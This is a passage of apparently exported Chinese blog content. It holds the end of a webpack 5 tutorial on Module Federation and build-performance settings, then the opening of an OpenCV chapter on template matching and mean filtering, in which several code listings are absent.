globalObject:&#x27;globalThis&#x27;    //需要全局的this来去  代替self   否则浏览器会self  undefined报错 &#125;,&#125;;\n现在 webpack 将打包一个库，其可以与 CommonJS、AMD 以及 script 标签使用\n九.模块联邦(Module Federation)多个独立的构建可以组成一个应用程序，这些独立的构建之间不应该存在依赖关系，因此可以单独开发和部署它们。这通常被称作微前端，但并不仅限于此。Webpack5 模块联邦可以让 Webpack 达到了线上 Runtime 的效果，让代码直接在项目间利用 CDN 直接共享，不再需要本地安装 Npm 包、构建再发布了！我们知道 Webpack 可以通过 DLL 或者 Externals 做代码共享时 Common Chunk，但不同应用和项目间这个任务就变得困难了，我们几乎无法在项目之间做到按需热插拔。\n早期NPM方式共享模块   代码的共享是将依赖作为library安装到我们的项目里进行webpack打包并且构建上线对于项目 Home 与 Search，需要共享一个模块时，最常见的办法就是将其抽成通用依赖并分别安装在各自项目中。虽然 Monorepo 可以一定程度解决重复安装和修改困难的问题，但依然需要走本地编译。\n真正 Runtime 的方式可能是 UMD 方式共享代码模块，即将模块用 Webpack UMD模式打包，并输出到其他项目中。这是非常普遍的模块共享方式：对于项目 Home 与 Search，直接利用 UMD 包复用一个模块。但这种技术方案问题也很明显，就是包体积无法达到本地编译时的优化效果，且库之间容易冲突。\n微前端：micro-frontends (MFE) 也是最近比较火的模块共享管理方式，微前端就是要解决多项目并存问题，多项目并存的最大问题就是模块共享，模块之间是不能有冲突。  对于微前端我们还要考虑样式冲突，声明周期管理冲突等问题，我们先不考虑这些   想把问题聚焦在资源加载的方式上   微前端一般有两种打包方式：1.子应用独立打包，模块实现解耦，但这种方式无法抽取公共的依赖，2.整体应用打一个打包 很好的解决我们上面第一种方式的问题，但是打包效率速度实在是太慢了。不具备水平的扩展能力。由于微前端还要考虑样式冲突、生命周期管理，所以本文只聚焦在资源加载方式上。微前端一般有两种打包方式：\n\n子应用独立打包，模块更解耦，但无法抽取公共依赖等。\n整体应用一起打包，很好解决上面的问题，但打包速度实在是太慢了，不具备水平扩展能力。\n\n终于提到本文的主角了，模块联邦方式作为 Webpack5 内置核心特性之一的 FederatedModule：这个方案是直接将一个应用的包应用于另一个应用，同时具备整体应用一起打包的公共依赖抽取能力。  比如：我们直接可以在Search应用里直接使用已经发布到线上的Home应用的组件。\n应用案例本案例模拟三个应用： Nav 、 Search 及 Home 。每个应用都是独立的，又通过模块邦联系到了一起。比如Home需要使用Nav组件共享出来的header，Search可能要使用Header和Home组件构建出来的HomeList。模块联邦将他们共享的模块暴露出来进行引用。1、Nav 导航src&#x2F;header.js\nconst Header = () =&gt; &#123; const header = document.createElement(&#x27;h1&#x27;) header.textContent = &#x27;公共头部内容&#x27; return header&#125;export default Header\nsrc&#x2F;index.js\nimport Header from &#x27;./Header&#x27;const div = document.createElement(&#x27;div&#x27;)div.appendChild(Header())document.body.appendChild(div)\nwebpack.config.js\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)const &#123; ModuleFederationPlugin&#125; = require(&#x27;webpack&#x27;).containermodule.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new HtmlWebpackPlugin(),  new ModuleFederationPlugin(&#123;   // 模块联邦名字   name: &#x27;nav&#x27;,   // 外部访问的资源名字   filename: &#x27;remoteEntry.js&#x27;,   // 引用的外部资源列表   remotes: &#123;&#125;,   // 暴露给外部资源列表   exposes: &#123;    &#x27;./Header&#x27;: &#x27;./src/Header.js&#x27;,   // 暴露 Header组件  key：可以定义成./Header 这个./Header并不代表是我当前引用下的某个路径   而是将来在别人用的时候基于这个路径来拼接url，值是正真的我们本地项目的应用  &#125;,   // 共享模块，如lodash   shared: &#123;&#125;,   // 如果我们的 header模块里有共享的第三方模块比如：lodash等，我们可以把他放到这里在打包的时候可以把第三方的共享的模块打到单独的一个包里。 &#125;),]&#125;\n应用 webpack 运行服务：\n[felix] nav $ npx webpack serve --port 3003\n\n2、Home 首页src&#x2F;HomeList\nconst HomeList = (num) =&gt; &#123; let str = &#x27;&lt;ul&gt;&#x27; for (let i = 0; i &lt; num; i++) &#123;  str += &#x27;&lt;li&gt;item &#x27; + i + &#x27;&lt;/li&gt;&#x27;&#125; str += &#x27;&lt;/ul&gt;&#x27; return str&#125;export default HomeList\nsrc&#x2F;index.js\nimport HomeList from &#x27;./HomeList&#x27;remotes: &#123;    nav\t(&#x27;nav/Header&#x27;)：remotes: &#123; nav &#125;Header    exposes: &#123;./Header&#x27;:&#x27;&#x27;&#125;import(&#x27;nav/Header&#x27;).then((Header) =&gt; &#123;  //引用模块联邦的组件  这样导入别人组件的时候需要通过异步的方式因为 网络共享或者是模块载入 是由延迟的，所以要通过promise的方式（异步模块加载的形式）去引用它。 const body = document.createElement(&#x27;div&#x27;) body.appendChild(Header.default()) document.body.appendChild(body) document.body.innerHTML += HomeList(5)&#125;)\nwebpack.config.js\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)const &#123; ModuleFederationPlugin&#125; = require(&#x27;webpack&#x27;).containermodule.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new HtmlWebpackPlugin(),  new ModuleFederationPlugin(&#123;   name: &quot;home&quot;,   filename: &quot;remoteEntry.js&quot;,   remotes: &#123;    nav: &quot;nav@http://localhost:3003/remoteEntry.js&quot;,    // 引用第三方或别人写好的应用的路径。远端的服务路径  &#125;,   exposes: &#123;    &#x27;./HomeList&#x27;: &#x27;./src/HomeList.js&#x27;,  &#125;,   shared: &#123;&#125;, &#125;),]&#125;\n应用 webpack 运行服务：\n[felix] nav $ npx webpack serve --port 3001\n\n3、search 搜索src&#x2F;index\nPromise.all([import(&#x27;nav/Header&#x27;), import(&#x27;home/HomeList&#x27;)]).then(([&#123;  default: Header&#125;, &#123;  default: HomeList&#125;]) =&gt; &#123;  document.body.appendChild(Header())  document.body.innerHTML += HomeList(4)&#125;)\nwebpack.config.js\nconst HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)const &#123; ModuleFederationPlugin&#125; = require(&#x27;webpack&#x27;).containermodule.exports = &#123; mode: &#x27;production&#x27;, entry: &#x27;./src/index.js&#x27;, plugins: [  new HtmlWebpackPlugin(),  new ModuleFederationPlugin(&#123;   name: &#x27;search&#x27;,   filename: &#x27;remoteEntry.js&#x27;,   remotes: &#123;    nav: &quot;nav@http://localhost:3003/remoteEntry.js&quot;,    home: &quot;home@http://localhost:3001/remoteEntry.js&quot;  &#125;,   exposes: &#123;&#125;,   shared: &#123;&#125;, &#125;),]&#125;\n应用 webpack 运行服务：\n[felix] nav $ npx webpack serve --port 3002\n十. 提升构建性能澄清：有时候我们会笼统的说webpack的性能提升，实际上webpack的性能提升可以分为两类  第一类是通过webpack来提升我们项目性能  如：网站的首屏到达时间，这个优化的受益者是c端的用户  ，2.提升webpack的构建编译性能，如：提高打包速度，降低打包时间，这个优化的受益者是我们的开发人员。   本章讲的是第二种把官网上提出的webpack5 提升构建性能的点  列：注意：  webpack 每个版本的优化点都是不一样的通用环境：这些优化既适用于开发化境也适用于生产环境。开发环境：生产环境：通用环境无论你是在 开发环境 还是在 生产环境 下运行构建脚本，以下最佳实践都会有所帮助。\n1、更新到最新版本使用最新的 webpack 版本。我们会经常进行性能优化。webpack 的最新稳定版本是：将 Node.js 更新到最新版本，也有助于提高性能。除此之外，将你的 package 管理工具（例如 npm 或者 yarn ）更新到最新版本，也有助于提高性能。较新的版本能够建立更高效的模块树以及提高解析速度。\n2、loader将 loader 应用于最少数量的必要模块。而非如下:\nmodule.exports = &#123; //... module: &#123;  rules: [  &#123;    test: /\\.js$/,    loader: &#x27;babel-loader&#x27;,  &#125;, ],&#125;,&#125;;\n通过使用 include 字段，仅将 loader 应用在实际需要将其转换的模块：\nconst path = require(&#x27;path&#x27;);module.exports = &#123; //... module: &#123;  rules: [  &#123;    test: /\\.js$/,    include: path.resolve(__dirname, &#x27;src&#x27;),    loader: &#x27;babel-loader&#x27;,  &#125;, ],&#125;,&#125;;\n3、引导(bootstrap)每个额外的 loader&#x2F;plugin 都有其启动时间。尽量少地使用工具。\n4、解析以下步骤可以提高解析速度：减少 resolve.modules , resolve.extensions , resolve.mainFiles ,resolve.descriptionFiles 中条目数量，因为他们会增加文件系统调用的次数。\n如果你不使用 symlinks（例如 npm link 或者 yarn link ），可以设置resolve.symlinks: false 。\n如果你使用自定义 resolve plugin 规则，并且没有指定 context 上下文，可以设置 resolve.cacheWithContext: false 。\n5、小即是快(smaller &#x3D; faster)减少编译结果的整体大小，以提高构建性能。尽量保持 chunk 体积小。使用数量更少&#x2F;体积更小的 library。\n在多页面应用程序中使用 SplitChunksPlugin 。在多页面应用程序中使用 SplitChunksPlugin ，并开启 async 模式。移除未引用代码。只编译你当前正在开发的那些代码。\n6、持久化缓存在 webpack 配置中使用 cache 选项。使用 package.json 中的 “postinstall”清除缓存目录。将 cache 类型设置为内存或者文件系统。 memory 选项很简单，它告诉 webpack在内存中存储缓存，不允许额外的配置：webpack.config.js\nmodule.exports = &#123; //... cache: &#123;  type: &#x27;memory&#x27;,&#125;,&#125;;\n7、自定义 plugin&#x2F;loader对它们进行概要分析，以免在此处引入性能问题。8、dll使用 DllPlugin 为更改不频繁的代码生成单独的编译结果。这可以提高应用程序的编译速度，尽管它增加了构建过程的复杂度。\nwebpack.all.config.js  配置关于dll相关的内容\nconst path = require(&#x27;path&#x27;)const webpack = require(&#x27;webpack&#x27;)module.exports = &#123;\tmode:&#x27;production&#x27;   // 在生产环境下面去做事情\tentry:&#123;\t\tjquery:[&#x27;jquery&#x27;],\t&#125;,  //注意：这个entry不是配置本地的包，而是要配置我们在node_modules里面安装的第三方的包\toutput:&#123;\t\tfilename:&#x27;[name].js&#x27;     // [name]  取到的是本身的jquery的chunk的名字\t\tpath:path.resolve(__dirname,&#x27;dll&#x27;),\t\tlibrary:&#x27;[name]_[hash]&#x27;    // 把他导出一个库    给这个包起了一个名字，打他导出一个第三方的包。\t&#125;,\tplugins:[\t\tnew webpack.DllPlugin(&#123;\t\t\tname:&#x27;[name]_[hash]&#x27;,     //名字和上面library取的名字是一样的\t\t\tpath:path.resolve(__dirname,&#x27;dll/manifest.json&#x27;)      // 把一个manifest的文件给生成出来\t\t&#125;)\t]&#125;package.json&#123;\t&quot;scripts&quot;:&#123;\t\t&quot;all&quot;:&quot;webpack --config ./webpack.dll.config.js&quot;\t&#125;&#125;webpack.config.jsconst webpack = require(&#x27;webpack&#x27;)const path = require(&#x27;path&#x27;)plugins:[\tnew webpack.DllReferencePlugin(&#123;\t\tmanifest:path.resolve(__dirname,&#x27;./all/manifest.json&#x27;)     // 它的值就是刚刚生成的manifest\t&#125;)    //和刚才的DllPlugin做了一个呼应]\n仅仅是提高了构建速度  如果想把jquery放到页面上显示的话还是有些问题的。   还需要对dll文件进行一次打包   可以使用插件来完成npm install add-asset-html-webpack-plugin -Dwebpack.config.js\nconst AddAssetHtmlPlugin = require(&#x27;add-asset-html-webpack-plugin&#x27;)plugins:[\tnew AddAssetHtmlPlugin(&#123;\t\tfilepath:path.resolve(__dirname,&#x27;./dll/jquery.js&#x27;),\t\tpublicPath:&#x27;./&#x27;\t&#125;)]\n编译大小有右边回来之前的大小，但是jquery会单独做成一个文件打出来，那我们可以在最后的时候在做一次打包，之前打包的时候可以使用dll这个所谓的link，实时上他还是通过link去加载的我们的jquery.js文件\n9、worker 池(worker pool)thread-loader 可以将非常消耗资源的 loader 分流给一个 worker pool。\n该怎么去测试worker pool  ，定义：它的实现原理就是我们可以把他定义在其他的loader前面然后把其他的loader放在另外一个worker pool的池里面去运行来提高我们的打包速度，其实就是把他放到另外一个cpu去运行了，来利用我们电脑的cpu。npm install thread-loader -D\nmodule:&#123;\trules:[\t\t&#123;\t\t\ttest:/\\.js$/,\t\t\texclude:/node_modules/,\t\t\tuse:[\t\t\t\t&#123;\t\t\t\t\tloader:&#x27;babel-loader&#x27;   //问了提高Babel-loader的打包速度可以把他放在 worker pool里运行（可以在单独的cpu里去运行）\t\t\t\toptions:&#123;\t\t\t\t\tpresets:[&#x27;@babel/preset-env&#x27;]   //这样他就可以解析我们js里面的一些es6的代码了\t\t\t\t\t&#125;\t\t\t\t&#125;,\t\t\t\t&#123;  // thread-loader启动需要大概耗费600ms的时间（有开销），这个loader对耗时非常打的loader有意义。\t\t\t\t\tloader:&#x27;thread-loader&#x27;,\t\t\t\t\toptions:&#123;\t\t\t\t\t\tworkers:2    // cpu的数量\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t]\t\t&#125;\t]&#125;\n\n不要使用太多的 worker，因为 Node.js 的 runtime 和 loader 都有启动开销。最小化 worker 和 mainprocess(主进程) 之间的模块传输。进程间通讯(IPC,inter process communication)是非常消耗资源的。\n10、Progress plugin将 ProgressPlugin 从 webpack 中删除，可以缩短构建时间。请注意，ProgressPlugin 可能不会为快速构建提供太多价值，因此，请权衡利弊再使用。\n开发环境以下步骤对于 开发环境 特别有帮助。1、增量编译使用 webpack 的 watch mode(监听模式)。而不使用其他工具来 watch 文件和调用webpack 。内置的 watch mode 会记录时间戳并将此信息传递给 compilation 以使缓存失效。\n在某些配置环境中，watch mode 会回退到 poll mode(轮询模式)。监听许多文件会导致 CPU 大量负载。在这些情况下，可以使用 watchOptions.poll 来增加轮询的间隔时间。\n2、在内存中编译下面几个工具通过在内存中（而不是写入磁盘）编译和 serve 资源来提高性能：\nwebpack-dev-serverwebpack-hot-middlewarewebpack-dev-middleware3、stats.toJson 加速webpack 4 默认使用 stats.toJson() 输出大量数据。除非在增量步骤中做必要的统计，否则请避免获取 stats 对象的部分内容。 webpack-dev-server 在 v3.1.3 以后的版本，包含一个重要的性能修复，即最小化每个增量构建步骤中，从 stats 对象获取的数据量。\n4、Devtool需要注意的是不同的 devtool 设置，会导致性能差异。\n“eval” 具有最好的性能，但并不能帮助你转译代码。如果你能接受稍差一些的 map 质量，可以使用 cheap-source-map 变体配置来提高性能使用 eval-source-map 变体配置进行增量编译。\n在大多数情况下，最佳选择是 eval-cheap-module-source-map 。\n5、避免在生产环境下才会用到的工具某些 utility, plugin 和 loader 都只用于生产环境。例如，在开发环境下使用TerserPlugin 来 minify(压缩) 和 mangle(混淆破坏) 代码是没有意义的。通常在开发环境下，应该排除以下这些工具：\nTerserPlugin[fullhash] &#x2F; [chunkhash] &#x2F; [contenthash]AggressiveSplittingPluginAggressiveMergingPluginModuleConcatenationPlugin\n6、最小化 entry chunkWebpack 只会在文件系统中输出已经更新的 chunk。某些配置选项（HMR,output.chunkFilename 的 [name] &#x2F; [chunkhash]&#x2F;[contenthash] ，[fullhash] ）来说，除了对已经更新的 chunk 无效之外，对于 entry chunk 也不会生效。确保在生成 entry chunk 时，尽量减少其体积以提高性能。下面的配置为运行时代码创建了一个额外的 chunk，所以它的生成代价较低：\nmodule.exports = &#123; // ... optimization: &#123;  runtimeChunk: true,&#125;,&#125;;\n7、避免额外的优化步骤Webpack 通过执行额外的算法任务，来优化输出结果的体积和加载性能。这些优化适用于小型代码库，但是在大型代码库中却非常耗费性能：\nmodule.exports = &#123; // ... optimization: &#123;  removeAvailableModules: false,  removeEmptyChunks: false,  splitChunks: false,&#125;,&#125;;\n\n8、输出结果不携带路径信息Webpack 会在输出的 bundle 中生成路径信息。然而，在打包数千个模块的项目中，这会导致造成垃圾回收性能压力。在 options.output.pathinfo 设置中关闭：\nmodule.exports = &#123; // ... output: &#123;  pathinfo: false,&#125;,&#125;;\n9、Node.js 版本 8.9.10-9.11.1Node.js v8.9.10 - v9.11.1 中的 ES2015 Map 和 Set 实现，存在 性能回退。Webpack 大量地使用这些数据结构，因此这次回退也会影响编译时间。之前和之后的 Node.js 版本不受影响。\n10、TypeScript loader你可以为 loader 传入 transpileOnly 选项，以缩短使用 ts-loader 时的构建时间。使用此选项，会关闭类型检查。如果要再次开启类型检查，请使用ForkTsCheckerWebpackPlugin 。使用此插件会将检查过程移至单独的进程，可以加快 TypeScript 的类型检查和 ESLint 插入的速度。\nmodule.exports = &#123; // ... test: /\\.tsx?$/, use: [ &#123;   loader: &#x27;ts-loader&#x27;,   options: &#123;    transpileOnly: true,  &#125;, &#125;,],&#125;;\n生产环境以下步骤对于 生产环境 特别有帮助。Source Mapssource map 相当消耗资源。你真的需要它们？\n-本篇完–三、项目实战篇\nWebpack与ReactWebpack与VueWebpack与jQueryWebpck与Node&#x2F;Express\n四、内部原理篇webpack原理开发loader plugin\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"opencv进阶","url":"/2020/07/04/python/opencv%E8%BF%9B%E9%98%B6%E7%AF%87/","content":"OpenCV进阶篇第10章　模板匹配模板匹配是一种最原始、最基本的识别方法，可以在原始图像中寻找特定图像的位置。模板匹配经常应用于简单的图像查找场景中，例如，在集体合照中找到某个人的位置。本章将介绍如何利用OpenCV实现模板匹配。\n\n10.1　模板匹配方法模板是被查找目标的图像，查找模板在原始图像中的哪个位置的过程就叫模板匹配。OpenCV提供的matchTemplate()方法就是模板匹配方法，其语法如下：\n result = cv2.matchTemplate(image, templ, method, mask)\n\n参数说明：　\nimage：原始图像。　\ntempl：模板图像，尺寸必须小于或等于原始图像。　\nmethod：匹配的方法，可用参数值如表10.1所示。\n表10.1　\n\n匹配方法的参数值　\nmask：可选参数。掩模，只有cv2.TM_SQDIFF和cv2.TM_CCORR_NORMED支持此参数，建议采用默认值。\n返回值说明：　\nresult：计算得出的匹配结果。如果原始图像的宽、高分别为W、H，模板图像的宽、高分别为w、h，result就是一个W-w+1列、H-h+1行的32位浮点型数组。数组中每一个浮点数都是原始图像中对应像素位置的匹配结果，其含义需要根据method参数来解读。在模板匹配的计算过程中，模板会在原始图像中移动。模板与重叠区域内的像素逐个对比，最后将对比的结果保存在模板左上角像素点索引位置对应的数组位置中。计算过程如图10.1所示。\n\n                                                                     图10.1　模板在原始图像中移动并逐个匹配\n\n使用cv2.TM_SQDIFF（平方差匹配）方法计算出的数组格式如下（其他方法计算出的数组格式相同，仅数值不同）：\n [[0.10165964 0.10123613 0.1008469  ... 0.10471864 0.10471849 0.10471849]\n  [0.10131165 0.10087635 0.10047968 ... 0.10471849 0.10471834 0.10471849]\n  [0.10089004 0.10045089 0.10006084 ... 0.10471849 0.10471819 0.10471849]\n  ...\n  [0.16168603 0.16291814 0.16366465 ... 0.12178455 0.12198001 0.12187888]\n  [0.15859096 0.16000605 0.16096526 ... 0.12245651 0.12261643 0.12248362]\n  [0.15512456 0.15672517 0.15791312 ... 0.12315679 0.1232616  0.12308815]]\n\n模板将原始图像中每一块区域都覆盖一遍，但结果数组的行、列数并不等于原始图像的像素的行、列数。假设模板的宽为w，高为h，原始图像的宽为W，高为H，如图10.2所示。模板移动到原始图像的边缘之后就不会继续移动了，所以模板的移动区域如图10.3所示，该区域的边长为“原始图像边长-模板边长+1”，最后加1是因为移动区域内的上下、左右的2个边都被模板覆盖到了，如果不加1会丢失数据。\n\n                                                                                    图10.2　模板和原始图像的宽、高\n\n\n                                                                                            图10.3　模板移动的范围\n\n10.2　单模板匹配匹配过程中只用到一个模板场景叫单模板匹配。原始图像中可能只有一个和模板相似的图像，也可能有多个。如果只获取匹配程度最高的那一个结果，这种操作叫作单目标匹配。如果需要同时获取所有匹配程度较高的结果，这种操作叫作多目标匹配。\n10.2.1　单目标匹配单目标匹配只获取一个结果即可，就是匹配程度最高的结果（如果使用平方差匹配，则为计算出的最小结果；如果使用相关匹配或相关系数匹配，则为计算出的最大结果）。本节以平方差匹配为例介绍。matchTemplate()方法的计算结果是一个二维数组，OpenCV提供了一个minMaxLoc()方法专门用来解析这个二维数组中的最大值、最小值以及这2个值对应的坐标，minMaxLoc()方法的语法如下：\n minValue, maxValue, minLoc, maxLoc = cv2.minMaxLoc(src, mask)\n\n参数说明：　\nsrc：matchTemplate()方法计算得出的数组。　\nmask：可选参数，掩模，建议使用默认值。\n返回值说明：　\nminValue：数组中的最小值。\nmaxValue：数组中的最大值。　\nminLoc：最小值的坐标，格式为(x, y)。　\nmaxLoc：最大值的坐标，格式为(x, y)。平方差匹配的计算结果越小，匹配程度越高。minMaxLoc()方法返回的minValue值就是模板匹配的最优结果，minLoc就是最优结果区域左上角的点坐标，区域大小与模板大小一致。\n【实例10.1】　为原始图片中匹配成功的区域绘制红框。将图10.4作为模板，将图10.5作为原始图像，使用cv2.TM_SQDIFF_NORMED方式进行模板匹配，在原始图像中找到与模板一样的图案，并在该图案上绘制红色方框。\n\n                                                                                                              图10.4　模板\n\n\n                                                                           图10.5　原始图片\n\n具体代码如下：\n\n上述代码的运行结果如图10.6所示。\n\n                                                                                    图10.6　模板匹配的效果\n\n在许多综艺节目里，导演组给选手们一幅图像，让选手在指定区域内寻找图像中的某一静物。为了增加游戏难度，导演组可能会让选手们从2个或者多个相似的场景中选择最佳的匹配结果。接下来，使用模板匹配的相应方法模拟这个游戏。\n【实例10.2】　从2幅图像中选择最佳的匹配结果。将图10.7作为模板，将图10.8和图10.9作为原始图像，使用cv2.TM_SQDIFF_NORMED方式进行模板匹配，在2幅原始图像中找到与模板匹配结果最好的图像，并在窗口中显示出来。\n\t\t\n                                                                                                      图10.7　模板\n\n\n                                                                                              图10.8　原始图像221\n\n\n                                                                                         图10.9　原始图像222\n\n具体代码如下：\n\n上述代码的运行结果如图10.10所示。\n\n                                                                        图10.10　从2幅图像中选择最佳的匹配结果\n\n网速的提升让容量较大的文件更容易在互联网上传播，最明显结果就是现在用户计算机里被堆满了各种各样的图像文件。图像文件与其他文件不同，相同内容的图像可能保存在不同大小、不同格式的文件中，这些文件的二进制字节码差别较大，很难用简单的程序识别。在没有高级识别软件的情况下想要找出内容相同的图像就只能一个一个打开用肉眼识别了。OpenCV能够打破图像文件规格、格式的限制来识别图像内容。\n【实例10.3】　查找重复的图像。图10.11所示的文件夹中有10幅图像，这些图像不仅有JPG格式的，还有PNG格式的，而且这些图像的分辨率也各不相同。接下来将编写一个程序，在该文件夹中找出哪些是重复的照片。\n\n                                                                          图10.11　文件夹中的所有照片文件\n\n想要解决这个问题，可以使用OpenCV提供的matchTemplate()方法来判断2幅图像的相似度，如果相似度大于0.9，就认为这2幅图像是相同的。具体代码如下：\n\n上述代码的运行结果如下：\n 相同的照片：10.png, 4.jpg,\n 相同的照片：2.jpg, 5.jpg, 9.png,\n\n10.2.2　多目标匹配多目标匹配需要将原始图像中所有与模板相似的图像都找出来，使用相关匹配或相关系数匹配可以很好地实现这个功能。如果计算结果大于某值（例如0.999），则认为匹配区域的图案和模板是相同的。\n【实例10.4】　为原始图片中所有匹配成功的图案绘制红框。将图10.12作为模板，将图10.13作为原始图像。原始图像中有很多重复的图案，每一个与模板相似的图案都需要被标记出来。\n\n                                                                                                 图10.12　模板\n\n\n                                                                                   图10.13　包含重复内容的原始图像\n\n使用cv2.TM_CCOEFF_NORMED方法进行模板匹配，使用for循环遍历matchTemplate()方法返回的结果，找到所有大于0.99的计算结果，在这些结果的对应区域位置绘制红色矩形边框。编写代码时要注意：数组的列数在图像坐标系中为横坐标，数组的行数在图像坐标系中为纵坐标。具体代码如下：\n\n上述代码的运行结果如图10.14所示，程序找到了3处与模板相似的图案。\n\n                                                                                                图10.14　匹配结果\n\n多目标匹配在实际生活中有很多应用场景。例如，统计一条快轨线路的站台总数；同一地点附近有2个地铁站，优先选择直线距离最短的地铁站等。\n【实例10.5】　统计一条快轨线路的站台总数。将图10.15作为模板，图10.16作为原始图像，在原始图像中标记快轨线路各个站台，统计这条快轨线路的站台总数。\n\n                                                                                                   图10.15　模板\n\n\n                                                                                             图10.16　原始图像\n\n使用cv2.TM_CCOEFF_NORMED方法进行模板匹配，使用for循环遍历matchTemplate()方法返回的结果，找到所有大于0.99的计算结果，在这些结果的对应区域位置绘制蓝色矩形边框，代码如下：       \n\n上述代码的运行结果如图10.17所示。实例10.5第6行中的results包含所有蓝色矩形边框左上角的横、纵坐标。利用这一特点，还可以模拟“同一地点附近有2个地铁站，优先选择直线距离最短的地铁站”这一生活场景，模板如图10.18所示。\n\n                                                                               图10.17　统计一条快轨线路的站台总数\n\n【实例10.6】　优先选择直线距离最短的地铁站。如图10.19所示，坐标为(62, 150)的地点附近有人民广场和解放大路两个地铁站，如何优先选择直线距离最短的地铁站呢？首先将图10.18作为模板，将图10.19作为原始图像，然后在原始图像中标记出这两个地铁站，最后计算并比较坐标为(62, 150)这个地点与这两个地铁站的直线距离。\n\n                                                                                                  图10.18　模板\n\n\n\n                                                                                             图10.19　原始图像\n\n使用cv2.TM_CCOEFF_NORMED方法进行模板匹配，使用for循环遍历matchTemplate()方法返回的结果，找到所有大于0.99的计算结果，在这些结果的对应区域位置绘制蓝色矩形边框，分别计算(62,150)到蓝色矩形边框左上角的距离，用绿色线段标记出直线距离最短的地铁站，代码如下：\n\n上述代码的运行结果如图10.20所示。\n\n                                                                        图10.20　优先选择直线距离最短的地铁站\n\n10.3　多模板匹配匹配过程中同时查找多个模板的操作叫多模板匹配。多模板匹配实际上就是进行了n次“单模板多目标匹配”操作，n的数量为模板总数。【实例10.7】　同时匹配3个不同的模板。将图10.21～图10.23作为模板，将图10.24（a）作为原始图像。\n\n                                                                                                   图10.21　模板1\n\n\n                                                                                              图10.22　模板2\n\n\n                                                                                                     图10.23　模板3\n\n每一个模板都要做一次“单模板多目标匹配”，最后把所有模板的匹配结果汇总到一起。“单模板多目标匹配”的过程可以封装成一个方法，方法参数为模板和原始图像，方法内部将计算结果再加工一下，直接返回所有红框左上角和右下角两点横纵坐标的列表。在方法之外，将所有模板计算得出的坐标汇总到一个列表中，按照这些汇总的坐标一次性将所有红框都绘制出来。具体代码如下：\n\n上述代码的运行效果如图10.24（b）所示。\n\n                                                                                            图10.24　多模板匹配效果\n\n使用多模板匹配能够解决很多生活中的实际问题。例如，一个收费停车场有4个车位，车位上陆续地停放了4辆车，通过多模板匹配，能够知晓这4辆车分别停在了哪个车位上。接下来将模拟这一生活场景。\n【实例10.8】　使用多模板匹配让控制台判断4辆车分别停在了哪个车位上。有4辆车按图10.25～图10.28的顺序陆续驶入停车场，这4辆车停在4个车位上的效果如图10.29所示。将图10.25～图10.28作为模板，将图10.29作为原始图像，使用cv2. TM_CCOEFF_NORMED方式进行模板匹配，在原始图像中找到与4个模板一样的图像后，在控制台上输出这4辆车分别停在了哪个车位上。\n说明在图10.29中，1号车位水平像素的取值范围是0200，2号车位水平像素的取值范围是200433，3号车位水平像素的取值范围是433656，4号车位水平像素的取值范围是656871。\n\n                                                                                                  图10.25　模板1\n\n\n                                                                                                 图10.26　模板2\n\n\n                                                                                                   图10.27　模板3\n\n\n                                                                                                    图10.28　模板4\n\n\n                                                                                                   图10.29　原始图像\n\n具体代码如下：\n\n上述代码的运行结果如下：\n 车位编号: 4\n 车位编号: 3\n 车位编号: 2\n 车位编号: 1\n\n上面的结果可以得出以下结论：图10.25所示的车辆停在了4号车位上，图10.26所示的车辆停在了3号车位上，图10.27所示的车辆停在了2号车位上，图10.28所示的车辆停在了1号车位上。\n10.4　小结模板匹配包括单模板匹配和多模板匹配，单模板匹配又包括单目标匹配和多目标匹配。实现这些内容的基础方法就是模板匹配方法，即matchTemplate()方法。其中，重点掌握模板匹配方法的6个参数值。此外，为了实现单目标匹配，除了需要使用模板匹配方法matchTemplate()外，还要使用minMaxLoc()方法，这个方法返回的就是单目标匹配的最优结果。对于多目标匹配，要将它和多模板匹配区分开：多目标匹配只有一个模板，而多模板匹配则有多个模板。\n第11章　滤波器在尽量保留原图像信息的情况下，去除图像内噪声、降低细节层次信息等一系列过程，叫作图像的平滑处理（或图像的模糊处理）。实现平滑处理最常用的工具就是滤波器。通过调节滤波器的参数，可以控制图像的平滑程度。OpenCV提供了种类丰富的滤波器，每种滤波器使用的算法均不同，但都能对图像中的像素值进行微调，让图像呈现平滑效果。本章将介绍均值滤波器、中值滤波器、高斯滤波器和双边滤波器的使用方法。\n\n11.1　均值滤波器\n                                                                                           图11.1　噪声图像\n\n图像中可能会出现这样一种像素，该像素与周围像素的差别非常大，导致从视觉上就能看出该像素无法与周围像素组成可识别的图像信息，降低了整个图像的质量。这种“格格不入”的像素就是图像的噪声。如果图像中的噪声都是随机的纯黑像素或者纯白像素，这样的噪声称作“椒盐噪声”或“盐噪声”。例如如图7.1所示的就是一幅只有噪声的图像，常称为“雪花点”。以一个像素为核心，其周围像素可以组成一个n行n列（简称n×n）的矩阵，这样的矩阵结构在滤波操作中被称为“滤波核”。矩阵的行、列数决定了滤波核的大小，如图11.2所示的滤波核大小为3×3，包含9个像素；图11.3所示的滤波核大小为5×5，包含25个像素。\n\n                                                                                             图11.2　3×3的滤波核\n\n\n                                                                                               图11.3　5×5的滤波核\n\n均值滤波器（也称为低通滤波器）可以把图像中的每一个像素都当成滤波核的核心，然后计算核内所有像素的平均值，最后让核心像素值等于这个平均值。例如，图11.4就是均值滤波的计算过程。滤波核大小为3×3，核心像素值是35，颜色较深，周围像素值都为110～150，因此可以认为核心像素是噪声。将滤波核中的所有像素值相加，然后除以像素个数，就得出了平均值123（四舍五入取整）。将核心像素的值改成123，其颜色就与周围颜色差别不大，图像就变得平滑了。这就是均值滤波去噪的原理。\n\n                                                                           图11.4　均值滤波的计算过程\n\nOpenCV将均值滤波器封装成blur()方法，其语法如下：\n dst = cv2.blur(src, ksize, anchor, borderType)\n\n参数说明：　\nsrc：被处理的图像。　\nksize：滤波核大小，其格式为(高度，宽度)，建议使用如(3, 3)、(5, 5)、(7, 7)等宽、高相等的奇数边长。滤波核越大，处理之后的图像就越模糊。　\nanchor：可选参数，滤波核的锚点，建议采用默认值，可以自动计算锚点。\nborderType：可选参数，边界样式，建议采用默认值。\n返回值说明：　\ndst：经过均值滤波处理之后的图像。\n【实例11.1】　